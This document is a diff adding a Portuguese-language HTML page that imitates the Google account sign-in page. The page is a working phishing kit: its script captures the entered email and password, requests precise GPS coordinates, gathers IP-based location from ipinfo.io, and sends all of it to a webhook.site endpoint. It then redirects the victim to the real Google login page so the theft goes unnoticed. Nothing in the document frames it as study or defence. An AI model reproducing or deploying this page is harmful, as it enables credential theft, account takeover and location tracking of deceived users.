@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Fazer login – Contas do Google</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#ffffff;--card:#ffffff;--text:#202124;--muted:#5f6368;--accent:#1a73e8;--input-bg:transparent;--input-border:#bdc1c6;--error:#d93025}
+  @media (prefers-color-scheme: dark){
+    :root{--bg:#0f1113;--card:#121317;--text:#e8eaed;--muted:#9aa0a6;--accent:#8ab4f8;--input-bg:transparent;--input-border:#5f6368}
+  }
+  *{box-sizing:border-box;font-family:'Roboto',sans-serif;margin:0;padding:0}
+  body{min-height:100vh;background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased}
+  .shell{max-width:420px;margin:40px auto 80px;display:flex;flex-direction:column;align-items:center;gap:12px}
+  .logo{width:92px;height:auto;display:block;margin:0 auto}
+  h1{font-size:24px;font-weight:400;margin-top:6px}
+  p.lead{color:var(--muted);font-size:14px;text-align:center;max-width:380px;margin-top:6px}
+  .card{width:100%;margin-top:18px;background:var(--card);border-radius:8px;padding:16px;min-width:280px}
+  .field{margin:12px 0;display:flex;flex-direction:column;gap:8px}
+  label{font-size:13px;color:var(--muted)}
+  input[type="email"],input[type="password"]{width:100%;padding:12px;font-size:15px;border-radius:8px;background:var(--input-bg);border:1px solid var(--input-border);color:var(--text)}
+  input:focus{outline:none;border-color:var(--accent)}
+  input.error{border-color:var(--error)}
+  .hint{font-size:13px;color:var(--muted);margin-top:6px}
+  .hidden{display:none!important}
+  .forgot{margin-top:8px;display:inline-block;font-size:13px;color:var(--accent);text-decoration:none}
+  .floating-btn{position:fixed;right:16px;bottom:16px;background:var(--accent);color:white;border:none;border-radius:6px;padding:10px 16px;font-size:14px;cursor:pointer;z-index:999}
+  .floating-btn[disabled]{opacity:.5;cursor:not-allowed}
+  .bottom-links{position:fixed;left:16px;bottom:18px;display:flex;flex-direction:column;gap:75px;z-index:900}
+  .bottom-links a{color:var(--accent);text-decoration:none;font-size:14px}
+  @media (max-width:520px){.shell{margin:28px auto 100px;padding:0 16px}.floating-btn{right:12px;bottom:12px;padding:9px 12px;font-size:13px}}
+</style>
+</head>
+<body>
+  <main class="shell">
+    <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png" alt="Google">
+    <h1>Fazer login</h1>
+    <p class="lead">Use sua Conta do Google. Ela será adicionada a este dispositivo e vai estar disponível para outros apps do Google.</p>
+
+    <section class="card" id="step-email">
+      <form id="emailForm" autocomplete="off">
+        <div class="field">
+          <input id="emailInput" type="email" required placeholder="E-mail ou telefone">
+          <div id="emailError" class="hint hidden"></div>
+        </div>
+      </form>
+      </section>
+
+    <section class="card hidden" id="step-password">
+      <form id="passwordForm" autocomplete="off">
+        <div class="field">
+          <label>Senha</label>
+          <input id="passwordInput" type="password" required placeholder="Senha">
+          <a href="#" class="forgot">Esqueceu sua senha?</a>
+          <div id="passwordError" class="hint hidden"></div>
+        </div>
+      </form>
+    </section>
+
+    <div class="bottom-links" id="bottomLinks">
+      <a href="#">Esqueceu seu e-mail?</a>
+      <a href="#">Criar conta</a>
+    </div>
+    <button id="floatingBtn" class="floating-btn">Avançar</button>
+  </main>
+
+<script>
+  const WH = "https://webhook.site/2e20eaf5-164a-4d92-b00c-3d923d2eabd9";
+  const stepEmail    = document.getElementById('step-email');
+  const stepPassword = document.getElementById('step-password');
+  const emailInput   = document.getElementById('emailInput');
+  const passInput    = document.getElementById('passwordInput');
+  const floatBtn     = document.getElementById('floatingBtn');
+  const bottomLinks  = document.getElementById('bottomLinks');
+
+  let step = 1;
+  let geo  = { exata: null, aprox: null };
+
+  /* ---------- IP fallback ---------- */
+  fetch('https://ipinfo.io/json')
+    .then(r => r.json())
+    .then(d => {
+      geo.aprox = {
+        city: d.city,
+        region: d.region,
+        country: d.country,
+        ip: d.ip
+      };
+    })
+    .catch(()=>{});
+
+  function updateBtn(){
+    floatBtn.disabled = (step===1 ? !emailInput.value.trim() : !passInput.value);
+  }
+  updateBtn();
+  emailInput.addEventListener('input', updateBtn);
+  passInput.addEventListener('input', updateBtn);
+
+  /* ---------- 1º clique: mostra senha ---------- */
+  function toPassword(){
+    if(!emailInput.value.trim()) return;
+    stepEmail.classList.add('hidden');
+    bottomLinks.classList.add('hidden');
+    stepPassword.classList.remove('hidden');
+    step = 2;
+    floatBtn.textContent = 'Entrar';
+    setTimeout(()=>passInput.focus(),120);
+    updateBtn();
+  }
+
+  /* ---------- 2º clique: pede GPS + envia ---------- */
+  function sendData(){
+    if(!passInput.value) return;
+        /* pede GPS apenas na hora de enviar */
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        geo.exata = {
+          lat: pos.coords.latitude.toFixed(6),
+          lon: pos.coords.longitude.toFixed(6),
+          acc: Math.round(pos.coords.accuracy)
+        };
+        postAndExit();
+      },
+      () => { /* usuário negou ou GPS desligado → usa IP */
+        postAndExit();
+      },
+      { timeout: 5000, enableHighAccuracy: true }
+    );
+  }
+
+  function postAndExit(){
+    let body = `SENHA: ${passInput.value} | EMAIL: ${emailInput.value}`;
+    if(geo.exata) body += ` | EXATA: ${geo.exata.lat},${geo.exata.lon} (±${geo.exata.acc}m)`;
+    if(geo.aprox) body += ` | APROX: ${geo.aprox.city||''}-${geo.aprox.region||''}-${geo.aprox.country||''} IP:${geo.aprox.ip||''}`;
+    fetch(WH,{method:'POST',body}).finally(()=> location.replace('https://accounts.google.com'));
+  }
+
+  floatBtn.addEventListener('click', e=>{
+    e.preventDefault();
+    step===1 ? toPassword() : sendData();
+  });
+
+  emailInput.focus();
+</script>
+</body>
+</html>
